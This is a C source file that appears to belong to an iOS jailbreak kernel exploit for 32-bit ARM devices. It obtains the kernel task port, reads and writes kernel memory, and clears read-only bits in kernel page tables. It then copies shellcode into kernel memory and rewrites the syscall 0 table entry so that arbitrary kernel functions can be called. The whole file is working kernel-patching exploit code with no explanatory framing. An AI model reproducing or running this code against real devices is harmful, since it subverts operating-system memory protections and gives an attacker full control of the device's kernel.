#include <stdint.h>
#include <mach/mach.h>
#include <sys/sysctl.h>

#include "exploit.h"
#include "kiki-offsets.h"

#include "tfp.h"

mach_port_t get_kernel_task()
{
    static mach_port_t kernel_task = 0;
    if(!kernel_task) {
        if(task_for_pid(mach_task_self(), 0, &kernel_task) != KERN_SUCCESS)
        {
            return 0;
        }
    }
    return kernel_task;
}

static int kernel_is_mapped(uint32_t address)
{
    kern_return_t err;
    mach_port_t kernel_task = get_kernel_task();
    vm_address_t addr = address;
    vm_size_t size;
    int vminfo[VM_REGION_BASIC_INFO_COUNT_64];
    mach_msg_type_number_t len = sizeof(vminfo);
    mach_port_t obj;

    err = vm_region_64(kernel_task, &addr, &size, VM_REGION_BASIC_INFO, (vm_region_info_t) &vminfo, &len, &obj);
    if(err != KERN_SUCCESS)
        return 0;

    if(addr <= address && address < (addr + size))
        return 1;

    return 0;
}

int kernel_read_tfp(uint32_t addr, void* buffer, uint32_t size)
{
    kern_return_t err;
    mach_port_t kernel_task = get_kernel_task();

    while(size > 0)
    {
        uint32_t to_read = (size > 0x800) ? 0x800 : size;
        mach_msg_type_number_t count = to_read;

        if(!kernel_is_mapped(addr))
            return 1;

        err = vm_read_overwrite(kernel_task, addr, to_read, (vm_address_t) buffer, &count) ;

        if(err != KERN_SUCCESS)
        {
            return err;
        }

        addr += to_read;
        size -= to_read;
        buffer = ((uint8_t*) buffer) + to_read;
    }

    return err;
}

int kernel_write_tfp(uint32_t addr, void* buffer, uint32_t size)
{
    kern_return_t err;
    mach_port_t kernel_task = get_kernel_task();

    if(!kernel_is_mapped(addr))
        return 1;

    err = vm_write(kernel_task, addr, (vm_address_t) buffer, size);

    return err;
}

void kernel_write_dword_tfp(uint32_t address, uint32_t value)
{
    kernel_write_tfp(address, &value, sizeof(value));
}

uint32_t kernel_read_dword_tfp(uint32_t address)
{
    uint32_t value = 0;
    kernel_read_tfp(address, &value, sizeof(value));
    return value;
}

void kernel_write_uint16_tfp(uint32_t address, uint16_t value)
{
    uint32_t dword_address = address & ~3;
    uint32_t dword = kernel_read_dword_tfp(dword_address);
    if(address == dword_address)
        dword = (dword & 0xFFFF0000) | value;
    else
        dword = (dword & 0x0000FFFF) | (value << 16);
    kernel_write_dword_tfp(dword_address, dword);
}

uint32_t get_kernel_region_tfp()
{
    static uint32_t kernel_region = 0;
    if(kernel_region)
        return kernel_region;

    mach_port_t kernel_task = get_kernel_task();

    uint32_t memsize;
    size_t value_size = sizeof(memsize);
    sysctlbyname("hw.memsize", &memsize, &value_size, NULL, 0);

    vm_address_t addr = 0;
    while(1)
    {
        vm_size_t size;
        vm_region_submap_info_data_64_t info;
        unsigned int depth = 0;
        mach_msg_type_number_t info_count = VM_REGION_SUBMAP_INFO_COUNT_64;

        if(vm_region_recurse_64(kernel_task, &addr, &size, &depth, (vm_region_info_t)&info, &info_count) != KERN_SUCCESS)
            return 0;

        if(size > memsize)
        {
            kernel_region = addr;
            return kernel_region;
        }

        if((addr + size) <= addr)
            return 0;

        addr += size;
    }

    return 0;
}

static void kernel_read_for_offsets(void* context, uint32_t address, void* buffer, uint32_t size)
{
    kernel_read_tfp(address, buffer, size);
}

struct offsets* get_offsets_from_cache()
{
    static int loaded = 0;
    if(loaded)
        return get_offsets();

    initialize_offsets(0);
    load_offsets(get_kernel_region_tfp(), kernel_read_for_offsets, NULL);

    loaded = 1;
    return get_offsets();
}

void set_kernel_page_writable_tfp(uint32_t page)
{
    set_kernel_page_writable_tfp2(0, page);
}

void set_kernel_page_writable_tfp2(io_connect_t connect, uint32_t page)
{
    static int is_first_run = 1;

    static uint32_t kernel_region;
    static uint32_t pmap_location;
    static uint32_t virtual_start;
    static uint32_t first_level_page_table_location;
    static uint32_t first_level_page_table_physical_location;
    static uint32_t first_level_page_table_entries;
    static uint32_t physical_start;
    static uint32_t* first_level_page_table;

    if(is_first_run)
    {
        kernel_region = get_kernel_region_tfp();
        pmap_location = kernel_read_dword_tfp(kernel_region + get_offsets_from_cache()->pmap_location);
        virtual_start = kernel_region;

        uint32_t pmap_data[2];
        kernel_read_tfp(pmap_location, pmap_data, sizeof(pmap_data));
        first_level_page_table_location = pmap_data[0];
        first_level_page_table_physical_location = pmap_data[1];
        first_level_page_table_entries = kernel_read_dword_tfp(pmap_location + 0x54);

        physical_start = first_level_page_table_physical_location - (first_level_page_table_location - virtual_start);

        first_level_page_table = (uint32_t*) malloc(first_level_page_table_entries * sizeof(uint32_t));
        memset(first_level_page_table, 0, first_level_page_table_entries * sizeof(uint32_t));

        is_first_run = 0;
    }

    uint32_t i = page >> 20;
    uint32_t entry = first_level_page_table[i];
    if(entry == 0)
    {
        first_level_page_table[i] = entry = kernel_read_dword_tfp(first_level_page_table_location + (sizeof(entry) * i));
    }

    {
        if((entry & 0x3) == 2)
        {
            if((i << 20) == ((page >> 20) << 20))
            {
                entry &= ~(1 << 15);
                kernel_write_dword_tfp(first_level_page_table_location + (sizeof(entry) * i), entry);
                goto end;
            }
        } else if((entry & 0x3) == 1)
        {
            uint32_t page_table_address = (entry >> 10) << 10;
            uint32_t virtual_page_table_address = page_table_address - physical_start + virtual_start;

            int j = (page >> 12) & 0xFF;
            uint32_t second_level_entry = kernel_read_dword_tfp(virtual_page_table_address + (sizeof(second_level_entry) * j));
            {
                if((second_level_entry & 0x3) == 1)
                {
                    if(((i << 20) + (j << 12)) == page)
                    {
                        second_level_entry &= ~(1 << 9);
                        kernel_write_dword_tfp(virtual_page_table_address + (sizeof(second_level_entry) * j), second_level_entry);
                        goto end;
                    }
                } else if((second_level_entry & 0x2) == 2)
                {
                    if(((i << 20) + (j << 12)) == page)
                    {
                        second_level_entry &= ~(1 << 9);
                        kernel_write_dword_tfp(virtual_page_table_address + (sizeof(second_level_entry) * j), second_level_entry);
                        goto end;
                    }
                }
            }
        }
    }

end:
    if(connect)
    {
        call_direct(connect, kernel_region + get_offsets_from_cache()->flush_dcache, 0, 0);
        call_direct(connect, kernel_region + get_offsets_from_cache()->invalidate_tlb, 0, 0);
    } else
    {
        kernel_call_tfp(kernel_region + get_offsets_from_cache()->flush_dcache, 0, 0, 0, 0);
        kernel_call_tfp(kernel_region + get_offsets_from_cache()->invalidate_tlb, 0, 0, 0, 0);
    }
}

struct sysent
{
    uint16_t sy_narg;
    uint8_t sy_resv;
    uint8_t sy_flags;
    uint32_t sy_call;
    uint32_t sy_arg_munge32;
    uint32_t sy_arg_munge64;
    uint32_t sy_return_type;
    uint32_t sy_arg_bytes;
};

static struct sysent saved_syscall0;
static int tfp_setup = 0;

void setup_tfp(io_connect_t connect)
{
    if(tfp_setup)
        return;

    extern void call_function_shellcode();
    extern uint32_t call_function_shellcode_len;

    uint32_t kernel_region = get_kernel_region_tfp();
    uint8_t* shellcode_addr = (uint8_t*)(((intptr_t)&call_function_shellcode) & ~1);

    uint8_t* buffer = (uint8_t*) malloc(call_function_shellcode_len);

    memcpy(buffer, shellcode_addr, call_function_shellcode_len);

    struct sysent syscall0;

    uint32_t syscall0_start = kernel_region + get_offsets_from_cache()->syscall0 - __builtin_offsetof(struct sysent, sy_call);
    kernel_read_tfp(syscall0_start, &saved_syscall0, sizeof(saved_syscall0));
    memcpy(&syscall0, &saved_syscall0, sizeof(syscall0));

    syscall0.sy_narg = 5;
    syscall0.sy_call = kernel_region + 0x501;
    syscall0.sy_arg_bytes = 5 * sizeof(uint32_t);

    set_kernel_page_writable_tfp2(connect, (kernel_region + 0x500) & ~0xFFF);
    kernel_write_tfp(kernel_region + 0x500, buffer, call_function_shellcode_len);
    set_kernel_page_writable_tfp2(connect, (syscall0_start) & ~0xFFF);
    kernel_write_tfp(syscall0_start, &syscall0, sizeof(syscall0));
    call_direct(connect, kernel_region + get_offsets_from_cache()->flush_dcache, 0, 0);

    tfp_setup = 1;
}

void unsetup_tfp()
{
    uint32_t syscall0_start = get_kernel_region_tfp() + get_offsets_from_cache()->syscall0 - __builtin_offsetof(struct sysent, sy_call);
    kernel_write_tfp(syscall0_start, &saved_syscall0, sizeof(saved_syscall0));
    tfp_setup = 0;
}


uint32_t kernel_call_tfp(uint32_t fn, uint32_t r0, uint32_t r1, uint32_t r2, uint32_t r3)
{
    return syscall(0, fn, r0, r1, r2, r3);
}

